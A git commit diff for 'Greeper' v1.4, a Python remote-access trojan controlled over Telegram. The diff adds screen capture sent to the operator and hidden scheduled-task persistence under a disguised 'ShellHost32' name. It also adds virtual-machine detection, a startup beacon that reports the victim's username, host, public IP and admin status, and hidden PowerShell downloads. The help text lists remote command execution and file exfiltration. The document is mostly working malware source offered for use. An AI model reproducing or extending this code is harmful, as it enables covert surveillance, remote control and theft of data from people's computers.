50e5110b446d8f8c7c33a405e628f9c120fdc0a6
GodInReach <95154586+giri190507@users.noreply.github.com>
2025-07-10 20:42:20 +0530

    Update: Greeper v1.4

--- Greeper.py
+++ Greeper.py
@@ -1,17 +1,31 @@
-#GREEPER V1.3
+#GREEPER V1.4
 
 import os
 import sys
 import shutil
 import time
 import subprocess as sp
-try:import telebot
-except:os.system("pip install telebot")
+import telebot
+import pyautogui
+import ctypes
 
 bot = telebot.TeleBot("YOUR_BOT_TOKEN")
 user = "YOUR_USER_ID"
 
-bot.send_message(user,"Greeper is online!\nSend /help for help")
+@bot.message_handler(commands=['screenshot'])
+def screenshot(msg):
+    if msg.from_user.id != int(user):
+        bot.send_message(msg.chat.id, "You don't have permission!")
+        return
+    try:
+        ss=pyautogui.screenshot()
+        #Saves the screenshot to a temporary file with date and time as filename
+        path=os.path.join(os.path.expandvars("%TEMP%"), time.strftime("%Y%m%d%H%M%S")+".png")
+        ss.save(path)
+        bot.send_photo(msg.chat.id, open(path, 'rb'))
+        os.remove(path)
+    except Exception as e:
+        bot.send_message(msg.chat.id, "Error taking screenshot!"+str(e))
 
 @bot.message_handler(commands=['upload'])
 def upload(msg):
@@ -25,6 +39,7 @@ def upload(msg):
             return
         file_name = url.split("/")[-1]
         file_path = os.path.join(os.getcwd(), file_name)
+        #Uses powershell to download file from the url in background (without requests module)
         sp.Popen(['powershell', '-command', f"Invoke-WebRequest -Uri '{url}' -OutFile '{file_path}'"], creationflags=sp.CREATE_NO_WINDOW)
         bot.send_message(msg.chat.id, f"File Uploaded to client successfully: {file_name}")
         bot.send_message(user, f"File saved to:\n{file_path}")
@@ -37,6 +52,7 @@ def upload_files(message):
         bot.send_message(message.chat.id, "You don't have permission!")
         return
     try:
+        #To download files from the user, we use the get_file method to get the file info and then download it
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         fname=message.document.file_name
@@ -69,11 +85,13 @@ def persistent(msg):
         bot.send_message(msg.chat.id, "You don't have permission!")
         return
     paypath=os.path.expanduser("~")+"\\AppData\\Roaming\\Microsoft\\AddIns\\ShellHost32.exe"
+    #It creates a scheduled task that runs the Greeper at every login from the above path
     persistent_cmd = f"""$taskName='ShellHost32';if(Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue){{Unregister-ScheduledTask -TaskName $taskName -Confirm:$false}};$action=New-ScheduledTaskAction -Execute '{paypath}';$trigger=New-ScheduledTaskTrigger -AtLogOn;$settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -MultipleInstances Parallel;if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){{$principal=New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest}}else{{$principal=New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive}};Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName $taskName -Settings $settings"""
     if os.path.isfile(paypath):
         bot.send_message(msg.chat.id, "Persistence already exists!")
     else:
-        shutil.copyfile(sys.executable, paypath)
+        #if the Greeper exe is not present it copies to the path
+        #shutil.copyfile(sys.executable, paypath)
         sp.Popen(['powershell', '-command', persistent_cmd], creationflags=sp.CREATE_NO_WINDOW)
         bot.send_message(user, "Persistence Added Sucessfully!")
         bot.send_message(user,"Greeper will run on every System boot!")
@@ -83,6 +101,7 @@ def uninstall(msg):
     if msg.from_user.id != int(user):
         bot.send_message(msg.chat.id, "You don't have permission!")
         return
+    #removes the scheduled task and deleted the exe from the saved path
     paypath=os.path.expanduser("~")+"\\AppData\\Roaming\\Microsoft\\AddIns\\ShellHost32.exe"
     uns_cmd=f"""$taskName='ShellHost32';if(Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue){{Unregister-ScheduledTask -TaskName $taskName -Confirm:$false}}"""
     if os.path.isfile(paypath):
@@ -135,7 +154,7 @@ def terminate(message):
     if message.from_user.id != int(user):
         bot.send_message(message.chat.id, "You don't have permission!")
         #return
-    bot.send_message(user,"Greeper is offline!")
+    bot.send_message(user,"Greeper Terminated!")
     global end
     end=True
     bot.stop_polling()
@@ -150,6 +169,7 @@ def msg(message):
     if message_content == "":
         bot.reply_to(message,"Empty Message!")
         return
+    #Powershell script to display a bit modern looking message box
     ps_script = f"""
     Add-Type -AssemblyName System.Windows.Forms;
     Add-Type -AssemblyName System.Drawing;
@@ -184,19 +204,70 @@ def help(message):
 Commands:
                  
 1. /cmd <command> - Execute cmd/ps commands
-2. /msg <message to display> - displays msg box
-3. /upload <URL> - Uploads file from URL
+2. /screenshot - Takes a screenshot and sends it
+3. /msg <message to display> - displays msg box
+4. /upload <URL> - Uploads file from URL
    You can also send file to bot directly
-4. /download <path> - Downloads file from client
-5. /persistent - Auto starts Greeper on Boot!
-6. /uninstall - Uninstalls persistence
-7. /terminate - Terminate current session
-8. /help - Displays this message
+5. /download <path> - Downloads file from client
+6. /persistent - Auto starts Greeper on Boot!
+7. /uninstall - Uninstalls persistence
+8. /terminate - Terminate current session
+9. /help - Displays this message
                  
 Replace <> with parameters
 Ex: /cmd dir
 """)
 
+def startup():
+    #To send the forst startup messages
+    try:
+        url="https://i.postimg.cc/Jz8D6Fgp/GREEPER.png"
+        file_path=os.path.join(os.path.expandvars("%TEMP%"), "Greeper.png")
+        sp.Popen(['powershell', '-command', f"Invoke-WebRequest -Uri '{url}' -OutFile '{file_path}'"], creationflags=sp.CREATE_NO_WINDOW)
+        bot.send_photo(user, open(file_path, 'rb'))
+    except Exception as e:
+        bot.send_message(user,"Error sending startup image!"+str(e))
+        bot.send_message(user,"Greeper is online!")
+    try: admin=ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except: admin="Undefined"
+    try: username=os.getlogin()
+    except: username="Undefined"
+    try: host=os.environ['COMPUTERNAME']
+    except: host="Undefined"
+    try:
+        rules = ['Virtualbox', 'vmbox', 'vmware']
+        command = sp.Popen("SYSTEMINFO | findstr  \"System Info\"", stderr=sp.PIPE,
+                           stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True,
+                           creationflags=0x08000000)
+        out, err = command.communicate()
+        command.wait()
+        for rule in rules:
+            if rule.lower() in out.lower():
+                vm=True
+                break
+            else:
+                vm=False
+    except Exception as e:
+        vm="Undefined"
+    try:
+        output = sp.Popen(['powershell', '-Command', '(Invoke-WebRequest -Uri https://ipv4.myip.wtf/text).Content'], stdout=sp.PIPE, stderr=sp.PIPE, shell=True)
+        IP = output.communicate()[0].decode().strip()
+    except Exception: IP = "None"
+
+    bot.send_message(user, f"""
+GREEPER BY G!R!
+
+Agent Online at {time.strftime('%Y-%m-%d %H:%M:%S')}
+Username: {username}
+Host: {host}
+IP: {IP}
+Admin: {admin}
+VM: {vm}
+
+Send /help to see commands.
+""")
+
+startup()
 end=False
 while not end:
     try:
